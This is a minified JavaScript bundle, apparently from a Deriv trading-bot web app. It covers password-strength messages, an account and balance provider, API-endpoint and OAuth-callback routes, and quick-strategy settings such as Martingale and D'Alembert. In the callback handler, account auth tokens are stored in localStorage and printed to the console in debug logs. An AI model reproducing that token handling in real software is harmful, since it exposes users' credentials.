                        decimal_count: e
                    }),
                    value: e => (0, c.NC)("Should be {{value}}", {
                        value: e
                    }),
                    betweenMinMax: (e, t) => (0, c.NC)("Should be between {{min_value}} and {{max_value}}", {
                        min_value: e,
                        max_value: t
                    }),
                    minNumber: e => (0, c.NC)("Should be more than {{min_value}}", {
                        min_value: e
                    }),
                    maxNumber: e => (0, c.NC)("Should be less than {{max_value}}", {
                        max_value: e
                    }),
                    password_warnings: {
                        use_a_few_words: () => (0, c.NC)("Use a few words, avoid common phrases"),
                        no_need_for_mixed_chars: () => (0, c.NC)("No need for symbols, digits, or uppercase letters"),
                        uncommon_words_are_better: () => (0, c.NC)("Add another word or two. Uncommon words are better."),
                        straight_rows_of_keys_are_easy: () => (0, c.NC)("Straight rows of keys are easy to guess"),
                        short_keyboard_patterns_are_easy: () => (0, c.NC)("Short keyboard patterns are easy to guess"),
                        use_longer_keyboard_patterns: () => (0, c.NC)("Use a longer keyboard pattern with more turns"),
                        repeated_chars_are_easy: () => (0, c.NC)('Repeats like "aaa" are easy to guess'),
                        repeated_patterns_are_easy: () => (0, c.NC)('Repeats like "abcabcabc" are only slightly harder to guess than "abc"'),
                        avoid_repeated_chars: () => (0, c.NC)("Avoid repeated words and characters"),
                        sequences_are_easy: () => (0, c.NC)("Sequences like abc or 6543 are easy to guess"),
                        avoid_sequences: () => (0, c.NC)("Avoid sequences"),
                        recent_years_are_easy: () => (0, c.NC)("Recent years are easy to guess"),
                        avoid_recent_years: () => (0, c.NC)("Avoid recent years"),
                        avoid_associated_years: () => (0, c.NC)("Avoid years that are associated with you"),
                        dates_are_easy: () => (0, c.NC)("Dates are often easy to guess"),
                        avoid_associated_dates_and_years: () => (0, c.NC)("Avoid dates and years that are associated with you"),
                        top10_common_password: () => (0, c.NC)("This is a top-10 common password"),
                        top100_common_password: () => (0, c.NC)("This is a top-100 common password"),
                        very_common_password: () => (0, c.NC)("This is a very common password"),
                        similar_to_common_password: () => (0, c.NC)("This is similar to a commonly used password"),
                        a_word_is_easy: () => (0, c.NC)("A word by itself is easy to guess"),
                        names_are_easy: () => (0, c.NC)("Names and surnames by themselves are easy to guess"),
                        common_names_are_easy: () => (0, c.NC)("Common names and surnames are easy to guess"),
                        capitalization_doesnt_help: () => (0, c.NC)("Capitalization doesn't help very much"),
                        all_uppercase_doesnt_help: () => (0, c.NC)("All-uppercase is almost as easy to guess as all-lowercase"),
                        reverse_doesnt_help: () => (0, c.NC)("Reversed words aren't much harder to guess"),
                        substitution_doesnt_help: () => (0, c.NC)("Predictable substitutions like '@' instead of 'a' don't help very much"),
                        user_dictionary: () => (0, c.NC)("This password is on the blacklist")
                    }
                });
                var N = n("40968"),
                    S = n("88199"),
                    C = n("30453"),
                    O = n("79649");
                let L = (0, f.Pi)(e => {
                    let {
                        children: t
                    } = e, {
                        isAuthorizing: n,
                        isAuthorized: a,
                        connectionStatus: l,
                        accountList: r,
                        activeLoginid: d
                    } = (0, O.T)(), u = (0, o.useRef)(!1), m = (0, o.useRef)(!1), b = (0, o.useRef)(null), p = (0, o.useRef)(null), {
                        client: f,
                        common: h
                    } = (0, _.oR)() ? ? {}, {
                        currentLang: v
                    } = (0, c.T_)(), {
                        oAuthLogout: y,
                        isOAuth2Enabled: k
                    } = (0, C.q)({
                        handleLogout: async () => f.logout(),
                        client: f
                    }), g = "false" === s.Z.get("logged_state");
                    (0, o.useEffect)(() => {
                        g && k && (null == f ? void 0 : f.is_logged_in) && y()
                    }, [g, y, k, null == f ? void 0 : f.is_logged_in]);
                    let E = (0, o.useMemo)(() => null == r ? void 0 : r.find(e => e.loginid === d), [d, r]);
                    (0, o.useEffect)(() => {
                        var e, t;
                        let n = null == f ? void 0 : null === (t = f.all_accounts_balance) || void 0 === t ? void 0 : null === (e = t.accounts) || void 0 === e ? void 0 : e[(null == E ? void 0 : E.loginid) ? ? ""];
                        n && (null == f || f.setBalance(n.balance.toFixed((0, T.i4S)(n.currency))), null == f || f.setCurrency(n.currency))
                    }, [null == E ? void 0 : E.loginid, null == f ? void 0 : f.all_accounts_balance]), (0, o.useEffect)(() => {
                        f && E && (null == f || f.setLoginId(d), null == f || f.setAccountList(r), null == f || f.setIsLoggedIn(!0))
                    }, [r, E, d, f]), (0, o.useEffect)(() => ((0, N.bf)(w()), () => {
                        b.current && clearInterval(b.current)
                    }), []), (0, o.useEffect)(() => {
                        h && v && h.setCurrentLanguage(v)
                    }, [v, h]), (0, o.useEffect)(() => {
                        if (f && !n && !u.current) {
                            var e;
                            u.current = !0, null === (e = S.api_base.api) || void 0 === e || e.websiteStatus().then(e => {
                                f.setWebsiteStatus(e.website_status)
                            }), b.current = setInterval(() => {
                                var e;
                                null === (e = S.api_base.api) || void 0 === e || e.time().then(e => {
                                    h.setServerTime((0, T.gbT)(e.time), !1)
                                }).catch(() => {
                                    h.setServerTime((0, T.gbT)(Date.now()), !0)
                                })
                            }, 1e4)
                        }
                    }, [f, h, n]);
                    let A = (0, o.useCallback)(async e => {
                        if (!e) return;
                        let t = e.data,
                            {
                                msg_type: n,
                                error: a
                            } = t;
                        if (((null == a ? void 0 : a.code) === "AuthorizationRequired" || (null == a ? void 0 : a.code) === "DisabledClient" || (null == a ? void 0 : a.code) === "InvalidToken") && await y(), "balance" === n && t && !a) {
                            let e = t.balance;
                            if (null == e ? void 0 : e.accounts) f.setAllAccountsBalance(e);
                            else if (null == e ? void 0 : e.loginid) {
                                var i;
                                if (!(null == f ? void 0 : null === (i = f.all_accounts_balance) || void 0 === i ? void 0 : i.accounts) || !(null == e ? void 0 : e.loginid)) return;
                                let t = { ...{ ...f.all_accounts_balance.accounts
                                    }[e.loginid]
                                };
                                t.balance = e.balance;
                                let n = { ...f.all_accounts_balance,
                                    accounts: { ...f.all_accounts_balance.accounts,
                                        [e.loginid]: t
                                    }
                                };
                                f.setAllAccountsBalance(n)
                            }
                        }
                    }, [f, y]);
                    return (0, o.useEffect)(() => {
                        if (!n && f) {
                            var e;
                            let t = null === S.api_base || void 0 === S.api_base ? void 0 : null === (e = S.api_base.api) || void 0 === e ? void 0 : e.onMessage().subscribe(A);
                            p.current = {
                                unsubscribe: null == t ? void 0 : t.unsubscribe
                            }
                        }
                        return () => {
                            if (p.current) {
                                var e, t;
                                null === (e = (t = p.current).unsubscribe) || void 0 === e || e.call(t)
                            }
                        }
                    }, [l, A, n, a, f]), (0, o.useEffect)(() => {
                        !n && a && !m.current && f && (m.current = !0, S.api_base.api.getSettings().then(e => {
                            var t;
                            null == f || f.setAccountSettings(e.get_settings), S.api_base.api.landingCompany({
                                landing_company: null === (t = e.get_settings) || void 0 === t ? void 0 : t.country_code
                            }).then(e => {
                                null == f || f.setLandingCompany(e.landing_company)
                            })
                        }), S.api_base.api.getAccountStatus().then(e => {
                            null == f || f.setAccountStatus(e.get_account_status)
                        }))
                    }, [n, a, f]), (0, i.jsx)(i.Fragment, {
                        children: t
                    })
                });
                var R = n("54798");
                n("674");
                let I = (0, o.lazy)(() => Promise.all([n.e("176"), n.e("648"), n.e("871")]).then(n.bind(n, 75013))),
                    D = (0, o.lazy)(() => Promise.all([n.e("892"), n.e("987")]).then(n.bind(n, 23085))),
                    {
                        TRANSLATIONS_CDN_URL: U,
                        R2_PROJECT_NAME: P,
                        CROWDIN_BRANCH_NAME: V
                    } = {
                        TRANSLATIONS_CDN_URL: void 0,
                        R2_PROJECT_NAME: void 0,
                        CROWDIN_BRANCH_NAME: void 0,
                        TRACKJS_TOKEN: void 0,
                        APP_ENV: void 0,
                        REF_NAME: void 0,
                        REMOTE_CONFIG_URL: void 0,
                        GD_CLIENT_ID: void 0,
                        GD_APP_ID: void 0,
                        GD_API_KEY: void 0,
                        DATADOG_SESSION_REPLAY_SAMPLE_RATE: void 0,
                        DATADOG_SESSION_SAMPLE_RATE: void 0,
                        DATADOG_APPLICATION_ID: void 0,
                        DATADOG_CLIENT_TOKEN: void 0,
                        RUDDERSTACK_KEY: void 0,
                        GROWTHBOOK_CLIENT_KEY: void 0,
                        GROWTHBOOK_DECRYPTION_KEY: void 0
                    },
                    M = (0, c.uC)({
                        cdnUrl: `${U}/${P}/${V}`
                    }),
                    B = (0, b.aj)((0, p.i7)((0, i.jsxs)(p.AW, {
                        path: "/",
                        element: (0, i.jsx)(o.Suspense, {
                            fallback: (0, i.jsx)(r.Z, {
                                message: (0, c.NC)("Please wait while we connect to the server...")
                            }),
                            children: (0, i.jsx)(c.$j, {
                                defaultLang: "EN",
                                i18nInstance: M,
                                children: (0, i.jsx)(_.g3, {
                                    children: (0, i.jsxs)(R.v, {
                                        children: [(0, i.jsx)(v, {}), (0, i.jsx)(L, {
                                            children: (0, i.jsx)(I, {})
                                        })]
                                    })
                                })
                            })
                        }),
                        children: [(0, i.jsx)(p.AW, {
                            index: !0,
                            element: (0, i.jsx)(D, {})
                        }), (0, i.jsx)(p.AW, {
                            path: "endpoint",
                            element: (0, i.jsx)(() => {
                                let e = (0, g.TA)({
                                    initialValues: {
                                        appId: localStorage.getItem(u.sE.configAppId) ? ? (0, T.rhL)(),
                                        serverUrl: localStorage.getItem(u.sE.configServerURL) ? ? (0, T.wmM)()
                                    },
                                    onSubmit: t => {
                                        localStorage.setItem(u.sE.configServerURL, t.serverUrl), localStorage.setItem(u.sE.configAppId, t.appId.toString()), e.resetForm({
                                            values: t
                                        })
                                    },
                                    validate: e => {
                                        let t = {};
                                        return !e.serverUrl && (t.serverUrl = "This field is required"), e.appId ? !/^(0|[1-9]\d*)(\.\d+)?$/.test(e.appId.toString()) && (t.appId = "Please enter a valid app ID") : t.appId = "This field is required", t
                                    }
                                });
                                return (0, i.jsxs)("div", {
                                    className: "endpoint",
                                    children: [(0, i.jsx)(E.x, {
                                        weight: "bold",
                                        className: "endpoint__title",
                                        children: "Change API endpoint"
                                    }), (0, i.jsxs)("form", {
                                        onSubmit: e.handleSubmit,
                                        className: "endpoint__form",
                                        children: [(0, i.jsx)(A.I, {
                                            "data-testid": "dt_endpoint_server_url_input",
                                            label: "Server",
                                            name: "serverUrl",
                                            message: e.errors.serverUrl,
                                            onBlur: e.handleBlur,
                                            onChange: e.handleChange,
                                            value: e.values.serverUrl
                                        }), (0, i.jsx)(A.I, {
                                            "data-testid": "dt_endpoint_app_id_input",
                                            label: "OAuth App ID",
                                            name: "appId",
                                            message: e.errors.appId,
                                            onBlur: e.handleBlur,
                                            onChange: e.handleChange,
                                            value: e.values.appId
                                        }), (0, i.jsxs)("div", {
                                            children: [(0, i.jsx)(k.z, {
                                                className: "endpoint__button",
                                                disabled: !e.dirty || !e.isValid,
                                                type: "submit",
                                                children: "Submit"
                                            }), (0, i.jsx)(k.z, {
                                                className: "endpoint__button",
                                                color: "black",
                                                onClick: () => {
                                                    let {
                                                        server_url: t,
                                                        app_id: n
                                                    } = (0, T.e_e)();
                                                    localStorage.setItem(u.sE.configServerURL, t), localStorage.setItem(u.sE.configAppId, n.toString()), e.resetForm({
                                                        values: {
                                                            appId: n,
                                                            serverUrl: t
                                                        }
                                                    }), window.location.reload()
                                                },
                                                variant: "outlined",
                                                type: "button",
                                                children: "Reset to original settings"
                                            })]
                                        })]
                                    })]
                                })
                            }, {})
                        }), (0, i.jsx)(p.AW, {
                            path: "callback",
                            element: (0, i.jsx)(() => (0, i.jsx)(y.AQ, {
                                onSignInSuccess: async e => {
                                    let t = {},
                                        n = {};
                                    for (let [a, i] of Object.entries(e))
                                        if (a.startsWith("acct")) {
                                            let l = a.replace("acct", "token");
                                            e[l] && (t[i] = e[l], n[i] = {
                                                loginid: i,
                                                token: e[l],
                                                currency: ""
                                            })
                                        } else if (a.startsWith("cur")) {
                                        let t = a.replace("cur", "acct");
                                        e[t] && (n[e[t]].currency = i)
                                    }
                                    localStorage.setItem("accountsList", JSON.stringify(t)), console.log("callback", n), localStorage.setItem("clientAccounts", JSON.stringify(n));
                                    let a = !1,
                                        i = await (0, d.wL)();
                                    if (i) {
                                        let {
                                            authorize: t,
                                            error: o
                                        } = await i.authorize(e.token1);
                                        if (localStorage.setItem("callback_token", t.toString()), i.disconnect(), !o) {
                                            var l;
                                            let e = Object.values(n),
                                                i = null == t ? void 0 : null === (l = t.account_list[0]) || void 0 === l ? void 0 : l.loginid,
                                                o = e.filter(e => e.loginid === i);
                                            o.length && (localStorage.setItem("authToken", o[0].token), localStorage.setItem("active_loginid", o[0].loginid), a = !0)
                                        }
                                    }!a && (console.log("test from callback", {
                                        tokens: e,
                                        active_loginid: s.Z.get("active_loginid") || "{}"
                                    }), localStorage.setItem("authToken", e.token1), localStorage.setItem("active_loginid", e.acct1)), window.location.assign("/")
                                },
                                renderReturnButton: () => (0, i.jsx)(k.z, {
                                    className: "callback-return-button",
                                    onClick: () => {
                                        window.location.href = "/"
                                    },
                                    children: "Return to Bot"
                                })
                            }), {})
                        })]
                    }))),
                    F = function() {
                        o.useEffect(() => {
                            var e, t;
                            return (0, m.UR)(), null === (t = window) || void 0 === t || null === (e = t.dataLayer) || void 0 === e || e.push({
                                event: "page_load"
                            }), () => {
                                let e = document.getElementById("survicate-box");
                                e && (e.style.display = "none")
                            }
                        }, []);
                        let e = function(e) {
                            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "",
                                n = new URLSearchParams(window.location.search),
                                a = e.loginid.startsWith("VR") ? "demo" : e.currency || t;
                            n.set("account", a), window.history.pushState({}, "", `${window.location.pathname}?${n.toString()}`)
                        };
                        return o.useEffect(() => {
                            let t = localStorage.getItem("accountsList"),
                                n = localStorage.getItem("clientAccounts"),
                                a = localStorage.getItem("active_loginid"),
                                i = new URLSearchParams(window.location.search).get("account");
                            if (!i) try {
                                if (!n) return;
                                let t = JSON.parse(n),
                                    i = Object.entries(t).find(e => {
                                        let [t, n] = e;
                                        return n.loginid === a
                                    });
                                if (!i) return;
                                let [l, o] = i;
                                e(o)
                            } catch (e) {
                                console.warn("Error", e)
                            }
                            if (t && n) try {
                                let l = JSON.parse(t),
                                    o = JSON.parse(n),
                                    s = !!i && Object.values(o).some(e => e.currency.toUpperCase() === i.toUpperCase()),
                                    r = (e, t) => {
                                        localStorage.setItem("authToken", e), localStorage.setItem("active_loginid", t)
                                    };
                                if ((null == i ? void 0 : i.toUpperCase()) === "DEMO") {
                                    let e = Object.entries(l).find(e => {
                                        let [t] = e;
                                        return t.startsWith("VR")
                                    });
                                    if (e) {
                                        let [t, n] = e;
                                        r(String(n), t);
                                        return
                                    }
                                }
                                if ((null == i ? void 0 : i.toUpperCase()) !== "DEMO" && s) {
                                    let e = Object.entries(o).find(e => {
                                        let [t, n] = e;
                                        return !t.startsWith("VR") && n.currency.toUpperCase() === (null == i ? void 0 : i.toUpperCase())
                                    });
                                    if (e) {
                                        let [t, n] = e;
                                        "token" in n && r(String(null == n ? void 0 : n.token), t);
                                        return
                                    }
                                }
                                if (!s) {
                                    let t = Object.entries(o).find(e => {
                                        let [t, n] = e;
                                        return n.loginid === a
                                    });
                                    if (!t) return;
                                    let [n, i] = t;
                                    e(i, "USD")
                                }
                            } catch (e) {
                                console.warn("Error", e)
                            }
                        }, []), (0, i.jsx)(b.pG, {
                            router: B
                        })
                    };
                n("83571");
                let j = async () => {
                    var e, t;
                    null === T.j73 || void 0 === T.j73 || null === (t = T.j73.get("active_loginid")) || void 0 === t || null === (e = t.match(/[a-zA-Z]+/g)) || void 0 === e || e.join("")
                };

                function G() {
                    return e => {
                        e.onupdatefound = () => {
                            let t = e.installing;
                            t.onstatechange = () => {
                                "installed" === t.state && navigator.serviceWorker.controller && (console.log("New version is found, refreshing the page..."), clearInterval(a))
                            }
                        }
                    }
                }
                j(), "serviceWorker" in navigator && window.addEventListener("load", () => {
                    let e = `${window.location.origin}/service-worker.js`;
                    navigator.serviceWorker.register(e).then(e => {
                        a = setInterval(() => {
                            e.update().then(G).catch(e => {
                                console.error("Error during service worker update:", e)
                            })
                        }, 36e5), e.onupdatefound = () => {
                            let t = e.installing;
                            t.onstatechange = () => {
                                if ("installed" === t.state && navigator.serviceWorker.controller && performance.now() > 36e5) {
                                    let e = new Event("UpdateAvailable");
                                    document.dispatchEvent(e)
                                }
                            }
                        }
                    }).catch(t => {
                        console.error("Error during service worker registration:", t, e)
                    })
                }), l.createRoot(document.getElementById("root")).render((0, i.jsx)(() => {
                    let [e, t] = o.useState(!1), {
                        loginInfo: n,
                        paramsToDelete: a
                    } = u.fr.getLoginInfoFromURL();
                    return (o.useEffect(() => {
                        (async () => {
                            if (n.length) try {
                                if (!u.fr.getDefaultActiveAccount(n)) return;
                                let e = {};
                                n.forEach(t => {
                                    e[t.loginid] = t.token
                                });
                                localStorage.setItem("accountsList", JSON.stringify(e)), u.fr.filterSearchParams(a), localStorage.setItem("authToken", n[0].token), localStorage.setItem("active_loginid", n[0].loginid)
                            } catch (e) {
                                console.error("Error setting up login info:", e)
                            }
                            u.fr.filterSearchParams(["lang"]), t(!0)
                        })()
                    }, [n, a]), e) ? (0, i.jsx)(F, {}) : (0, i.jsx)(r.Z, {
                        message: (0, c.NC)("Initializing...")
                    })
                }, {}))
            },
            85414: function(e, t, n) {
                "use strict";
                n.d(t, {
                    j: () => G
                });
                var a = n("88199"),
                    i = n("48059"),
                    l = n("68853"),
                    o = n("85893");
                n("67294");
                let s = e => {
                        let {
                            max_payout: t,
                            max_ticks: n
                        } = e ? ? {
                            max_payout: 0,
                            max_ticks: 0
                        };
                        return (0, o.jsxs)("div", {
                            className: "sell_conditions",
                            children: [(0, o.jsxs)("div", {
                                className: "sell_conditions__take_profit",
                                children: [(0, o.jsx)("span", {
                                    children: (0, o.jsx)("strong", {
                                        children: (0, i.NC)("Take Profit: ")
                                    })
                                }), (0, o.jsx)("span", {
                                    children: (0, i.NC)("The position closes once its profit exceeds the take-profit amount")
                                })]
                            }), (0, o.jsxs)("div", {
                                className: "sell_conditions__tick_count",
                                children: [(0, o.jsx)("span", {
                                    children: (0, o.jsx)("strong", {
                                        children: (0, i.NC)("Tick Count: ")
                                    })
                                }), (0, o.jsx)("span", {
                                    children: (0, i.NC)("The holding period measured in ticks before the position is sold")
                                })]
                            }), (0, o.jsx)("div", {
                                children: (0, o.jsx)(i.Xx, {
                                    i18n_default_text: "The position closes when the input condition is met or upon reaching the maximum payout of {{ max_payout }} or maximum tick of {{ max_ticks }}, whichever occurs first.",
                                    values: {
                                        max_payout: t,
                                        max_ticks: n
                                    }
                                })
                            })]
                        })
                    },
                    r = () => ({
                        type: "label",
                        label: (0, i.NC)("Sell conditions"),
                        description: s
                    }),
                    d = () => ({
                        type: "label",
                        label: (0, i.NC)("Size"),
                        description: (0, i.NC)("The size used to multiply the stake after a successful trade for the next trade.")
                    }),
                    c = () => ({
                        type: "sell_conditions",
                        name: "sell_conditions"
                    }),
                    u = () => ({
                        type: "label",
                        label: (0, i.NC)("Growth rate"),
                        description: (0, i.NC)("Your stake will grow at the specified growth rate per tick as long as the current spot price remains within the range of the previous spot price.")
                    }),
                    m = () => ({
                        type: "growth_rate",
                        name: "growth_rate",
                        attached: !0,
                        validation: ["number", "required", "ceil"]
                    }),
                    b = () => ({
                        type: "label",
                        label: (0, i.NC)("Unit"),
                        description: (0, i.NC)("The unit used to multiply the stake after a losing trade for the next trade.")
                    }),
                    p = () => ({
                        type: "number",
                        name: "take_profit",
                        should_have: [{
                            key: "boolean_tick_count",
                            value: !1
                        }],
                        hide_without_should_have: !0,
                        attached: !0,
                        has_currency_unit: !0
                    }),
                    f = () => ({
                        type: "number",
                        name: "tick_count",
                        should_have: [{
                            key: "boolean_tick_count",
                            value: !0
                        }],
                        hide_without_should_have: !0,
                        attached: !0,
                        has_currency_unit: !1
                    }),
                    _ = () => ({
                        type: "min",
                        value: 1,
                        getMessage: e => (0, i.NC)("Must be a number higher than {{ min }}", {
                            min: Number(e) - 1
                        })
                    }),
                    h = () => ({
                        type: "label",
                        label: (0, i.NC)("Asset"),
                        description: (0, i.NC)("The underlying market your bot will trade with this strategy.")
                    }),
                    v = () => ({
                        type: "symbol",
                        name: "symbol"
                    }),
                    y = () => ({
                        type: "label",
                        label: (0, i.NC)("Contract type"),
                        description: (0, i.NC)("Your bot will use this contract type for every run")
                    }),
                    k = () => ({
                        type: "tradetype",
                        name: "tradetype",
                        dependencies: ["symbol"]
                    }),
                    g = () => ({
                        type: "label",
                        label: (0, i.NC)("Purchase condition"),
                        description: (0, i.NC)("Your bot uses a single trade type for each run.")
                    }),
                    T = () => ({
                        type: "contract_type",
                        name: "type",
                        dependencies: ["symbol", "tradetype"]
                    }),
                    E = () => ({
                        type: "label",
                        label: (0, i.NC)("Initial stake"),
                        description: (0, i.NC)("The amount that you stake for the first trade. Note that this is the minimum stake amount.")
                    }),
                    A = () => ({
                        type: "number",
                        name: "stake",
                        validation: ["number", "required", "ceil", _()],
                        has_currency_unit: !0
                    }),
                    x = () => ({
                        type: "label",
                        label: (0, i.NC)("Duration"),
                        description: (0, i.NC)("How long each trade takes to expire.")
                    }),
                    w = () => ({
                        type: "durationtype",
                        name: "durationtype",
                        dependencies: ["symbol", "tradetype"],
                        attached: !0
                    }),
                    N = () => ({
                        type: "number",
                        name: "duration",
                        attached: !0,
                        validation: ["number", "required", "min", "max"]
                    }),
                    S = () => ({
                        type: "label",
                        label: (0, i.NC)("Profit threshold"),
                        description: (0, i.NC)("The bot will stop trading if your total profit exceeds this amount.")
                    }),
                    C = () => ({
                        type: "number",
                        name: "profit",
                        validation: ["number", "required", "ceil", _()],
                        has_currency_unit: !0
                    }),
                    O = () => ({
                        type: "label",
                        label: (0, i.NC)("Loss threshold"),
                        description: (0, i.NC)("The bot will stop trading if your total loss exceeds this amount.")
                    }),
                    L = () => ({
                        type: "number",
                        name: "loss",
                        validation: ["number", "required", "ceil", _()],
                        has_currency_unit: !0
                    }),
                    R = () => ({
                        type: "label",
                        label: (0, i.NC)("Size"),
                        description: (0, i.NC)("The size used to multiply the stake after a losing trade for the next trade.")
                    }),
                    I = () => ({
                        type: "label",
                        label: (0, i.NC)("Size"),
                        description: (0, i.NC)("The size used to multiply the stake after a successful trade for the next trade.")
                    }),
                    D = () => ({
                        type: "number",
                        name: "size",
                        validation: ["number", "required", "floor", {
                            type: "min",
                            value: String((0, a.config)().QUICK_STRATEGY.DEFAULT.size),
                            getMessage: e => (0, i.NC)("The value must be equal or greater than {{ min }}", {
                                min: e
                            })
                        }]
                    }),
                    U = () => ({
                        type: "label",
                        label: (0, i.NC)("Unit"),
                        description: (0, i.NC)("Number of unit(s) to be added to the next trade after a losing trade. One unit is equivalent to the amount of initial stake.")
                    }),
                    P = () => ({
                        type: "label",
                        label: (0, i.NC)("Unit"),
                        description: (0, i.NC)("Number of unit(s) to be added to the next trade after a successful trade. One unit is equivalent to the amount of initial stake.")
                    }),
                    V = () => ({
                        type: "number",
                        name: "unit",
                        validation: ["number", "required", "ceil", _()]
                    }),
                    M = () => ({
                        type: "checkbox",
                        name: "boolean_max_stake",
                        label: (0, i.NC)("Max stake"),
                        description: (0, i.NC)("The stake for your next trade will reset to the initial stake if it exceeds this value."),
                        attached: !0
                    }),
                    B = () => ({
                        type: "number",
                        name: "max_stake",
                        validation: ["number", "required", "ceil", "min"],
                        should_have: [{
                            key: "boolean_max_stake",
                            value: !0
                        }],
                        hide_without_should_have: !0,
                        attached: !0,
                        has_currency_unit: !0
                    }),
                    F = () => ({
                        type: "label",
                        name: "label_last_digit_prediction",
                        label: (0, i.NC)("Last Digit Prediction"),
                        description: (0, i.NC)("Your prediction of the last digit of the asset price."),
                        should_have: [{
                            key: "tradetype",
                            value: "",
                            multiple: ["matchesdiffers", "overunder"]
                        }],
                        hide_without_should_have: !0
                    }),
                    j = () => ({
                        type: "number",
                        name: "last_digit_prediction",
                        validation: ["number", "required", "min", "max", "integer"],
                        should_have: [{
                            key: "tradetype",
                            value: "",
                            multiple: ["matchesdiffers", "overunder"]
                        }],
                        hide_without_should_have: !0
                    }),
                    G = () => ({
                        MARTINGALE: {
                            name: "martingale_max-stake",
                            label: (0, i.NC)("Martingale"),
                            rs_strategy_name: "martingale",
                            description: (0, l.MARTINGALE)(),
                            fields: [
                                [h(), v(), y(), k(), g(), T(), F(), j(), E(), A(), x(), w(), N()],
                                [S(), C(), O(), L(), R(), D(), M(), B()]
                            ]
                        },
                        D_ALEMBERT: {
                            name: "dalembert_max-stake",
                            label: (0, i.NC)("D’Alembert"),
                            rs_strategy_name: "d'alembert",
                            description: (0, l.D_ALEMBERT)(),
                            fields: [
                                [h(), v(), y(), k(), g(), T(), F(), j(), E(), A(), x(), w(), N()],
                                [S(), C(), O(), L(), U(), V(), M(), B()]
                            ]
                        },
                        OSCARS_GRIND: {
                            name: "oscars_grind_max-stake",
                            label: (0, i.NC)("Oscar’s Grind"),
                            rs_strategy_name: "oscar's-grind",
                            description: (0, l.OSCARS_GRIND)(),
                            fields: [
                                [h(), v(), y(), k(), g(), T(), F(), j(), E(), A(), x(), w(), N()],
                                [S(), C(), O(), L(), M(), B()]
                            ]
                        },
                        REVERSE_MARTINGALE: {
                            name: "reverse_martingale",
                            label: (0, i.NC)("Reverse Martingale"),
                            rs_strategy_name: "reverse martingale",
                            description: (0, l.REVERSE_MARTINGALE)(),
                            fields: [
                                [h(), v(), y(), k(), g(), T(), F(), j(), E(), A(), x(), w(), N()],
                                [S(), C(), O(), L(), I(), D(), M(), B()]
                            ]
                        },
                        REVERSE_D_ALEMBERT: {
                            name: "reverse_dalembert",
                            label: (0, i.NC)("Reverse D’Alembert"),
                            rs_strategy_name: "reverse d'alembert",
                            description: (0, l.REVERSE_D_ALEMBERT)(),
                            fields: [
                                [h(), v(), y(), k(), g(), T(), F(), j(), E(), A(), x(), w(), N()],
                                [S(), C(), O(), L(), P(), V(), M(), B()]
                            ]
                        },
                        STRATEGY_1_3_2_6: {
                            name: "1_3_2_6",
                            label: (0, i.NC)("1-3-2-6"),
                            rs_strategy_name: "1-3-2-6",
                            description: (0, l.STRATEGY_1_3_2_6)(),
                            fields: [
                                [h(), v(), y(), k(), g(), T(), F(), j(), E(), A(), x(), w(), N()],
                                [S(), C(), O(), L()]
                            ]
                        },
                        ACCUMULATORS_MARTINGALE: {
                            name: "accumulators_martingale",
                            label: (0, i.NC)("Martingale"),
                            rs_strategy_name: "accumulators_martingale",
                            description: [],
                            fields: [
                                [h(), v(), E(), A(), u(), m()],
                                [S(), C(), O(), L(), d(), D(), r(), c(), p(), f(), M(), B()]
                            ]
                        },
                        ACCUMULATORS_DALEMBERT: {
                            name: "accumulators_dalembert",
                            label: (0, i.NC)("D’Alembert"),
                            rs_strategy_name: "accumulators_dalembert",
                            description: [],
                            fields: [
                                [h(), v(), E(), A(), u(), m()],
                                [S(), C(), O(), L(), b(), V(), r(), c(), p(), f(), M(), B()]
                            ]
                        },
                        ACCUMULATORS_MARTINGALE_ON_STAT_RESET: {
                            name: "accumulators_martingale_on_stat_reset",
                            label: (0, i.NC)("Martingale on Stat Reset"),
                            rs_strategy_name: "accumulators_martingale_on_stat_reset",
                            description: [],
                            fields: [
                                [h(), v(), E(), A(), u(), m()],
                                [S(), C(), O(), L(), d(), D(), r(), c(), p(), f(), M(), B()]
                            ]
                        },
                        ACCUMULATORS_DALEMBERT_ON_STAT_RESET: {
                            name: "accumulators_dalembert_on_stat_reset",
                            label: (0, i.NC)("D'Alembert on Stat Reset"),
                            rs_strategy_name: "accumulators_dalembert_on_stat_reset",
                            description: [],
                            fields: [
                                [h(), v(), E(), A(), u(), m()],
                                [S(), C(), O(), L(), b(), V(), r(), c(), p(), f(), M(), B()]
                            ]
                        },
                        ACCUMULATORS_REVERSE_MARTINGALE: {
                            name: "accumulators_reverse_martingale",
                            label: (0, i.NC)("Reverse Martingale"),
                            rs_strategy_name: "accumulators_reverse_martingale",
                            description: [],
                            fields: [
                                [h(), v(), E(), A(), u(), m()],
                                [S(), C(), O(), L(), d(), D(), r(), c(), p(), f(), M(), B()]
                            ]
                        },
                        ACCUMULATORS_REVERSE_MARTINGALE_ON_STAT_RESET: {
                            name: "accumulators_reverse_martingale_on_stat_reset",
                            label: (0, i.NC)("Reverse Martingale on Stat Reset"),
                            rs_strategy_name: "accumulators_reverse_martingale_on_stat_reset",
                            description: [],
                            fields: [
                                [h(), v(), E(), A(), u(), m()],
                                [S(), C(), O(), L(), d(), D(), r(), c(), p(), f(), M(), B()]
                            ]
                        },
                        ACCUMULATORS_REVERSE_DALEMBERT: {
                            name: "accumulators_reverse_dalembert",
                            label: (0, i.NC)("Reverse D'Alembert"),
                            rs_strategy_name: "accumulators_reverse_dalembert",
                            description: [],
                            fields: [
                                [h(), v(), E(), A(), u(), m()],
                                [S(), C(), O(), L(), b(), V(), r(), c(), p(), f(), M(), B()]
                            ]
                        },
                        ACCUMULATORS_REVERSE_DALEMBERT_ON_STAT_RESET: {
                            name: "accumulators_reverse_dalembert_on_stat_reset",
                            label: (0, i.NC)("Reverse D'Alembert on Stat Reset"),
                            rs_strategy_name: "accumulators_reverse_dalembert_on_stat_reset",
                            description: [],
                            fields: [
                                [h(), v(), E(), A(), u(), m()],
                                [S(), C(), O(), L(), b(), V(), r(), c(), p(), f(), M(), B()]
                            ]
                        }
                    })
            },
            64376: function(e, t, n) {
                "use strict";
                n.d(t, {
                    FM: function() {
                        return o
                    },
                    Mq: function() {
                        return c
                    },
                    Qb: function() {
                        return l
                    },
                    Yk: function() {
                        return u
                    },
                    xH: function() {
                        return r
                    },
                    zw: function() {
                        return d
                    }
                });
                var a = n(21995),
                    i = n(48059);
                let l = "user guide",
                    o = "videos on deriv bot",
                    s = "quick strategy guides",
                    r = () => [{
                        id: 1,
                        type: "Tour",
                        subtype: "OnBoard",
                        content: (0, i.NC)("Get started on D-Bot"),
                        src: (0, a.oY)("dbot-onboard-tour.png"),
